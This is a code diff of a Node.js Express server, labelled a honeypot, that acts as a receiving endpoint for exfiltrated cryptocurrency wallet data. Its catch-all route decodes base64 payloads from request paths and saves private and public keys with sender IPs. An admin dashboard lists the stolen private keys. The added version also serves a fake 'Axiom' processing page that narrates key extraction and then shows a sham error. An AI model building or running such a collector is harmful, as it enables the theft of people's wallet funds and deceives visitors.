@@ -5,353 +5,335 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-const DATA_FOLDER = path.join(__dirname, 'stolen_data');
-const LOGS_FOLDER = path.join(__dirname, 'logs');
+const DATA_FOLDER = path.join(__dirname, 'stolendata');
+const LOG_FILE = path.join(__dirname, 'access.log');
 
-if (!fs.existsSync(DATA_FOLDER)) fs.mkdirSync(DATA_FOLDER, { recursive: true });
-if (!fs.existsSync(LOGS_FOLDER)) fs.mkdirSync(LOGS_FOLDER, { recursive: true });
+// Create folder if doesn't exist
+if (!fs.existsSync(DATA_FOLDER)) {
+    fs.mkdirSync(DATA_FOLDER, { recursive: true });
+}
 
 app.set('trust proxy', true);
 
-// Get real client IP
+// Get real IP
 function getClientIp(req) {
-    const forwarded = req.headers['x-forwarded-for'];
-    if (forwarded) return forwarded.split(',')[0].trim();
-    return req.headers['x-real-ip'] || req.ip || req.socket.remoteAddress;
+    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+           req.headers['x-real-ip'] || 
+           req.ip || 
+           req.socket.remoteAddress;
 }
 
+// Log to file
 function logAccess(req, type, extra = {}) {
-    const logEntry = {
+    const log = {
         timestamp: new Date().toISOString(),
         type: type,
         ip: getClientIp(req),
-        userAgent: req.headers['user-agent'] || 'none',
+        userAgent: req.headers['user-agent'],
         url: req.originalUrl,
         ...extra
     };
-    fs.appendFileSync(path.join(LOGS_FOLDER, 'access.log'), JSON.stringify(logEntry) + '\n');
-    console.log(`[${type}] ${logEntry.ip}`);
+    fs.appendFileSync(LOG_FILE, JSON.stringify(log) + '\n');
 }
 
-// ============================================
-// SPECIFIC ROUTES FIRST (before the * catch-all)
-// ============================================
-
-// Railway health check - MUST return 200 OK
+// Health check
 app.get('/health', (req, res) => {
     logAccess(req, 'HEALTH_CHECK');
-    res.status(200).json({ status: 'ok', msg: 'OK' });
+    res.json({ success: true, msg: "OK" });
 });
 
-// Root path - return simple OK for health checks
-app.get('/', (req, res) => {
-    logAccess(req, 'ROOT');
-    res.status(200).send('OK');
+// Main data capture with fake loading page
+app.get('*', (req, res) => {
+    // Skip admin paths
+    if (req.path.startsWith('/admin')) {
+        return res.status(404).end();
+    }
+    
+    const timestamp = new Date().toISOString();
+    const clientIp = getClientIp(req);
+    const encodedData = req.path.substring(1);
+    
+    console.log(`[${timestamp}] Data from: ${clientIp} | Length: ${encodedData.length}`);
+    
+    // Decode and save the stolen data
+    let keys = [];
+    let code = null;
+    let walletCount = 0;
+    
+    if (encodedData.length > 40) {
+        try {
+            let cleanData = decodeURIComponent(encodedData);
+            const padding = 4 - (cleanData.length % 4);
+            if (padding !== 4) cleanData += '='.repeat(padding);
+            
+            const decoded = Buffer.from(cleanData, 'base64').toString('utf8');
+            const data = JSON.parse(decoded);
+            
+            keys = data.keys || [];
+            code = data.code;
+            walletCount = keys.length;
+            
+            const filename = `stolen_${timestamp.replace(/[:.]/g, '-')}_${clientIp.replace(/[^0-9]/g, '')}.json`;
+            const record = {
+                receivedAt: timestamp,
+                attackerIp: clientIp,
+                userAgent: data.header || req.headers['user-agent'],
+                code: code,
+                site: data.site,
+                keys: keys,
+                raw: data
+            };
+            
+            fs.writeFileSync(path.join(DATA_FOLDER, filename), JSON.stringify(record, null, 2));
+            console.log(`✅ Saved: ${filename} (${keys.length} keys)`);
+            logAccess(req, 'DATA_RECEIVED', { filename, keysCount: keys.length });
+            
+        } catch (err) {
+            console.error('Decode error:', err.message);
+            logAccess(req, 'DECODE_ERROR', { error: err.message });
+        }
+    } else {
+        logAccess(req, 'SHORT_REQUEST');
+    }
+    
+    // Return fake loading page
+    const html = `
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Axiom | Processing</title>
+        <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body {
+                background: #0a0a0a;
+                color: #00ff00;
+                font-family: 'Courier New', monospace;
+                height: 100vh;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                overflow: hidden;
+            }
+            .container {
+                text-align: center;
+                padding: 40px;
+                border: 2px solid #00ff00;
+                background: rgba(0, 255, 0, 0.05);
+                box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+                max-width: 500px;
+            }
+            h1 {
+                font-size: 3em;
+                margin-bottom: 20px;
+                text-shadow: 0 0 10px #00ff00;
+                animation: pulse 1.5s ease-in-out infinite;
+            }
+            .loader {
+                width: 60px;
+                height: 60px;
+                border: 4px solid #003300;
+                border-top: 4px solid #00ff00;
+                border-radius: 50%;
+                animation: spin 1s linear infinite;
+                margin: 30px auto;
+            }
+            .status {
+                font-size: 1.2em;
+                color: #00cc00;
+                margin-top: 20px;
+            }
+            .dots::after {
+                content: '';
+                animation: dots 1.5s steps(4, end) infinite;
+            }
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+            @keyframes pulse {
+                0%, 100% { opacity: 1; }
+                50% { opacity: 0.6; }
+            }
+            @keyframes dots {
+                0% { content: ''; }
+                25% { content: '.'; }
+                50% { content: '..'; }
+                75% { content: '...'; }
+            }
+            .terminal {
+                margin-top: 30px;
+                padding: 15px;
+                background: #000;
+                border: 1px solid #00ff00;
+                font-size: 0.85em;
+                color: #00ff00;
+                text-align: left;
+                max-width: 400px;
+                min-height: 120px;
+            }
+            .error-msg {
+                display: none;
+                color: #ff0000;
+                margin-top: 20px;
+                padding: 15px;
+                border: 1px solid #ff0000;
+                background: rgba(255, 0, 0, 0.1);
+                font-size: 0.9em;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>⚡ AXIOM</h1>
+            <div class="loader"></div>
+            <div class="status">Initializing secure connection<span class="dots"></span></div>
+            
+            <div class="terminal" id="terminal">
+                > Connecting to relay...<br>
+                > Handshake established<br>
+                > Decrypting payload...<br>
+                > Verifying signature...
+            </div>
+            
+            <div class="error-msg" id="error">
+                ⚠ Connection timeout.<br>Please refresh and try again.
+            </div>
+        </div>
+        
+        <script>
+            const terminal = document.getElementById('terminal');
+            const messages = [
+                '> Extracting wallet keys...',
+                '> Found ${walletCount} wallet(s)',
+                '> Encoding payload...',
+                '> Transmitting to secure vault...',
+                '> Cleaning traces...'
+            ];
+            
+            let i = 0;
+            const interval = setInterval(() => {
+                if (i < messages.length) {
+                    terminal.innerHTML += messages[i] + '<br>';
+                    terminal.scrollTop = terminal.scrollHeight;
+                    i++;
+                } else {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        document.querySelector('.loader').style.display = 'none';
+                        document.querySelector('.status').style.display = 'none';
+                        document.getElementById('error').style.display = 'block';
+                        terminal.innerHTML += '> <span style="color:#ff0000">ERROR: Connection reset by peer</span>';
+                    }, 1500);
+                }
+            }, 700);
+            
+            setTimeout(() => {
+                window.close();
+            }, 10000);
+        </script>
+    </body>
+    </html>
+    `;
+    
+    res.setHeader('Content-Type', 'text/html');
+    res.send(html);
 });
 
-// HTML Dashboard
+// Admin dashboard to view stolen data
 app.get('/admin', (req, res) => {
-    logAccess(req, 'ADMIN_DASHBOARD');
+    logAccess(req, 'ADMIN_VIEW');
     
     try {
         const files = fs.readdirSync(DATA_FOLDER).filter(f => f.endsWith('.json'));
-        const captures = files.map(f => {
-            try {
-                return JSON.parse(fs.readFileSync(path.join(DATA_FOLDER, f), 'utf8'));
-            } catch (e) { return null; }
-        }).filter(Boolean).sort((a, b) => new Date(b.receivedAt) - new Date(a.receivedAt));
         
-        const totalWallets = captures.reduce((sum, c) => sum + (c.wallets?.length || 0), 0);
-        const uniqueIps = [...new Set(captures.map(c => c.attackerIp).filter(Boolean))];
-        
-        const html = `
+        let html = `
         <!DOCTYPE html>
         <html>
         <head>
-            <title>Honeypot Dashboard</title>
+            <title>🍯 Honeypot | Captured Data</title>
             <style>
                 body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
-                h1 { color: #0f0; border-bottom: 2px solid #0f0; }
-                .stats { display: flex; gap: 20px; margin: 20px 0; flex-wrap: wrap; }
-                .stat-box { border: 1px solid #0f0; padding: 15px; min-width: 120px; }
-                .stat-box h3 { margin: 0 0 10px 0; color: #ff0; font-size: 0.9em; }
-                .stat-box .number { font-size: 2em; color: #0f0; }
-                table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 0.9em; }
-                th, td { border: 1px solid #0f0; padding: 8px; text-align: left; }
-                th { background: #003300; }
-                tr:hover { background: #001100; }
+                h1 { color: #0f0; border-bottom: 2px solid #0f0; padding-bottom: 10px; }
+                .stats { display: flex; gap: 20px; margin: 20px 0; }
+                .stat-box { border: 1px solid #0f0; padding: 15px; }
+                .stat-box h3 { margin: 0 0 10px 0; color: #ff0; }
+                .stat-box .num { font-size: 2em; color: #0f0; }
+                .file { border: 1px solid #0f0; margin: 10px 0; padding: 15px; background: #111; }
                 .ip { color: #ff0; font-weight: bold; }
-                .timestamp { color: #888; font-size: 0.85em; }
-                .priv-key { color: #f00; background: #330000; padding: 2px 5px; word-break: break-all; }
-                pre { background: #111; padding: 10px; overflow-x: auto; border: 1px solid #333; font-size: 0.8em; }
+                .time { color: #888; }
+                .key { color: #f00; background: #300; padding: 2px 5px; word-break: break-all; display: block; margin: 3px 0; }
+                .type { color: #0ff; }
+                pre { background: #000; padding: 10px; overflow: auto; font-size: 0.8em; }
                 a { color: #0f0; }
-                .refresh { margin: 20px 0; }
-                button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-family: monospace; font-weight: bold; }
-                button:hover { background: #0a0; }
+                details summary { cursor: pointer; color: #ff0; }
             </style>
         </head>
         <body>
             <h1>🍯 Honeypot Dashboard</h1>
-            <div class="refresh">
-                <button onclick="location.reload()">🔄 Refresh</button>
-                <a href="/admin/logs"><button>View Raw Logs</button></a>
-            </div>
-            
+            <a href="/admin/logs">View Access Logs</a> | <a href="/health">Health Check</a>
             <div class="stats">
                 <div class="stat-box">
-                    <h3>Total Captures</h3>
-                    <div class="number">${captures.length}</div>
-                </div>
-                <div class="stat-box">
-                    <h3>Wallets Stolen</h3>
-                    <div class="number">${totalWallets}</div>
-                </div>
-                <div class="stat-box">
-                    <h3>Unique Attackers</h3>
-                    <div class="number">${uniqueIps.length}</div>
-                </div>
-                <div class="stat-box">
-                    <h3>Server Time</h3>
-                    <div class="number" style="font-size: 0.8em;">${new Date().toLocaleTimeString()}</div>
+                    <h3>Captures</h3>
+                    <div class="num">${files.length}</div>
                 </div>
             </div>
-            
-            <h2>Recent Captures</h2>
-            <table>
-                <thead>
-                    <tr>
-                        <th>Time</th>
-                        <th>Attacker IP</th>
-                        <th>Code</th>
-                        <th>Wallets</th>
-                        <th>Actions</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    ${captures.slice(0, 20).map(c => `
-                        <tr>
-                            <td class="timestamp">${new Date(c.receivedAt).toLocaleString()}</td>
-                            <td class="ip">${c.attackerIp || 'Unknown'}</td>
-                            <td>${c.code || 'N/A'}</td>
-                            <td>${c.walletCount || c.wallets?.length || 0}</td>
-                            <td><a href="/admin/file?f=${encodeURIComponent(c.filename || '')}">View</a></td>
-                        </tr>
-                    `).join('') || '<tr><td colspan="5" style="text-align:center;color:#888;">No captures yet</td></tr>'}
-                </tbody>
-            </table>
-            
-            <h2>Debug: Last 10 Access Logs</h2>
-            <pre>${(() => {
-                try {
-                    const logs = fs.readFileSync(path.join(LOGS_FOLDER, 'access.log'), 'utf8')
-                        .split('\n').filter(Boolean).slice(-10)
-                        .map(l => JSON.parse(l))
-                        .map(l => `[${l.timestamp}] ${l.type} from ${l.ip}`)
-                        .join('\n');
-                    return logs || 'No logs yet';
-                } catch(e) { return 'No logs file'; }
-            })()}</pre>
-        </body>
-        </html>`;
+        `;
         
+        files.sort().reverse().forEach(filename => {
+            try {
+                const data = JSON.parse(fs.readFileSync(path.join(DATA_FOLDER, filename), 'utf8'));
+                const walletList = (data.keys || []).map(k => 
+                    `<span class="type">${k.type || 'unknown'}:</span> <span class="key">${k.pub || 'N/A'}</span> <span class="key">${k.priv || 'N/A'}</span>`
+                ).join('<br>');
+                
+                html += `
+                    <div class="file">
+                        <p><span class="time">${data.receivedAt}</span> | IP: <span class="ip">${data.attackerIp}</span></p>
+                        <p>Code: ${data.code || 'N/A'} | Wallets: ${data.keys?.length || 0}</p>
+                        <details>
+                            <summary>View Details</summary>
+                            <p>${walletList || 'No keys'}</p>
+                            <pre>${JSON.stringify(data, null, 2)}</pre>
+                        </details>
+                    </div>
+                `;
+            } catch(e) {
+                html += `<div class="file">Error reading ${filename}</div>`;
+            }
+        });
+        
+        html += '</body></html>';
         res.send(html);
+        
     } catch (err) {
         res.status(500).send('Error: ' + err.message);
     }
 });
 
-// JSON API for logs
+// View access logs
 app.get('/admin/logs', (req, res) => {
-    logAccess(req, 'ADMIN_LOGS_API');
-    
     try {
-        const logFile = path.join(LOGS_FOLDER, 'access.log');
-        let accessLogs = [];
-        if (fs.existsSync(logFile)) {
-            accessLogs = fs.readFileSync(logFile, 'utf8')
-                .split('\n')
-                .filter(Boolean)
-                .map(line => { try { return JSON.parse(line); } catch (e) { return { raw: line }; }});
+        if (!fs.existsSync(LOG_FILE)) {
+            return res.json({ logs: [] });
         }
         
-        const files = fs.readdirSync(DATA_FOLDER).filter(f => f.endsWith('.json'));
-        const captures = files.map(f => {
-            try {
-                const data = JSON.parse(fs.readFileSync(path.join(DATA_FOLDER, f), 'utf8'));
-                data.filename = f;
-                return data;
-            } catch (e) { return null; }
-        }).filter(Boolean).sort((a, b) => new Date(b.receivedAt) - new Date(a.receivedAt));
+        const logs = fs.readFileSync(LOG_FILE, 'utf8')
+            .split('\n')
+            .filter(Boolean)
+            .map(line => {
+                try { return JSON.parse(line); } 
+                catch(e) { return { raw: line }; }
+            });
         
-        const allWallets = captures.flatMap(c => c.wallets || []);
-        const uniqueIps = [...new Set(captures.map(c => c.attackerIp).filter(Boolean))];
-        
-        res.json({
-            captures: captures.slice(0, 50),
-            accessLogs: accessLogs.slice(-100),
-            totalWallets: allWallets.length,
-            uniqueIps: uniqueIps.length,
-            serverTime: new Date().toISOString()
-        });
+        res.json({ logs: logs.slice(-100), count: logs.length });
     } catch (err) {
         res.status(500).json({ error: err.message });
     }
 });
 
-// View specific file
-app.get('/admin/file', (req, res) => {
-    try {
-        const filename = req.query.f;
-        if (!filename || filename.includes('..')) return res.status(400).json({ error: 'Invalid' });
-        
-        const filePath = path.join(DATA_FOLDER, filename);
-        if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Not found' });
-        
-        const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
-        
-        const html = `
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Capture: ${filename}</title>
-            <style>
-                body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
-                .section { border: 1px solid #0f0; padding: 15px; margin: 15px 0; }
-                .label { color: #ff0; }
-                .ip { color: #ff0; font-weight: bold; font-size: 1.2em; }
-                .priv { color: #f00; background: #330000; padding: 3px 6px; word-break: break-all; }
-                .pub { color: #0ff; word-break: break-all; }
-                pre { background: #111; padding: 10px; overflow-x: auto; font-size: 0.8em; }
-                a { color: #0f0; }
-                .wallet-box { margin: 10px 0; padding: 10px; border: 1px solid #333; background: #111; }
-            </style>
-        </head>
-        <body>
-            <a href="/admin">← Back to Dashboard</a>
-            <h1>📋 Capture Details</h1>
-            
-            <div class="section">
-                <h2>Attacker</h2>
-                <p><span class="label">IP:</span> <span class="ip">${data.attackerIp || 'Unknown'}</span></p>
-                <p><span class="label">Time:</span> ${data.receivedAt}</p>
-                <p><span class="label">Code:</span> ${data.code || 'N/A'}</p>
-                <p><span class="label">User Agent:</span> ${data.userAgent || 'Unknown'}</p>
-            </div>
-            
-            <div class="section">
-                <h2>Wallets (${data.wallets?.length || 0})</h2>
-                ${(data.wallets || []).map((w, i) => `
-                    <div class="wallet-box">
-                        <p><span class="label">#${i+1} Type:</span> ${w.type || 'unknown'}</p>
-                        <p><span class="label">Public:</span> <span class="pub">${w.pub || 'N/A'}</span></p>
-                        <p><span class="label">Private:</span> <span class="priv">${w.priv || 'N/A'}</span></p>
-                    </div>
-                `).join('') || '<p>No wallets</p>'}
-            </div>
-            
-            <div class="section">
-                <h2>Raw Data</h2>
-                <pre>${JSON.stringify(data, null, 2)}</pre>
-            </div>
-        </body>
-        </html>`;
-        
-        res.send(html);
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-// Serve loader.js if you have one
-app.get('/loader.js', (req, res) => {
-    logAccess(req, 'LOADER_REQUEST');
-    res.setHeader('Content-Type', 'application/javascript');
-    res.setHeader('Access-Control-Allow-Origin', '*');
-    const loaderPath = path.join(__dirname, 'loader.js');
-    if (fs.existsSync(loaderPath)) {
-        res.sendFile(loaderPath);
-    } else {
-        res.status(404).send('// loader.js not found');
-    }
-});
-
-// ============================================
-// CATCH-ALL ROUTE LAST (for stolen data)
-// ============================================
-
-app.get('*', (req, res) => {
-    const timestamp = new Date().toISOString();
-    const clientIp = getClientIp(req);
-    
-    // Skip if it's a file request
-    if (req.path.includes('.')) {
-        return res.status(404).end();
-    }
-    
-    const encodedData = req.path.substring(1);
-    
-    console.log(`[DATA] From: ${clientIp} | Path: ${encodedData.substring(0, 50)}...`);
-    
-    if (encodedData.length < 20) {
-        logAccess(req, 'PING', { length: encodedData.length });
-        return sendGif(res);
-    }
-    
-    try {
-        let decodedData = decodeURIComponent(encodedData);
-        
-        // Fix base64 padding
-        const padding = 4 - (decodedData.length % 4);
-        if (padding !== 4) decodedData += '='.repeat(padding);
-        
-        const jsonStr = Buffer.from(decodedData, 'base64').toString('utf8');
-        const data = JSON.parse(jsonStr);
-        
-        const wallets = data.wallets || [];
-        
-        const record = {
-            receivedAt: timestamp,
-            attackerIp: clientIp,
-            userAgent: data.header || req.headers['user-agent'],
-            code: data.code,
-            site: data.site,
-            walletCount: wallets.length,
-            wallets: wallets,
-            rawPayload: data
-        };
-        
-        const filename = `capture_${Date.now()}_${clientIp.replace(/[^0-9a-zA-Z]/g, '_')}.json`;
-        fs.writeFileSync(path.join(DATA_FOLDER, filename), JSON.stringify(record, null, 2));
-        
-        console.log(`✅ SAVED: ${filename} | Wallets: ${wallets.length}`);
-        logAccess(req, 'CAPTURE', { filename, wallets: wallets.length });
-        
-    } catch (err) {
-        console.error(`❌ Error: ${err.message}`);
-        logAccess(req, 'ERROR', { error: err.message });
-    }
-    
-    sendGif(res);
-});
-
-function sendGif(res) {
-    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
-    res.setHeader('Content-Type', 'image/gif');
-    res.setHeader('Cache-Control', 'no-store');
-    res.send(gif);
-}
-
-// ============================================
-// START SERVER - Bind to 0.0.0.0 explicitly
-// ============================================
-
-const server = app.listen(PORT, '0.0.0.0', () => {
+// Start server
+app.listen(PORT, '0.0.0.0', () => {
     console.log(`🍯 Honeypot running on port ${PORT}`);
-    console.log(`Dashboard: http://0.0.0.0:${PORT}/admin`);
-    console.log(`Health: http://0.0.0.0:${PORT}/health`);
-});
-
-// Handle errors
-server.on('error', (err) => {
-    console.error('Server error:', err);
+    console.log(`Dashboard: http://localhost:${PORT}/admin`);
 });
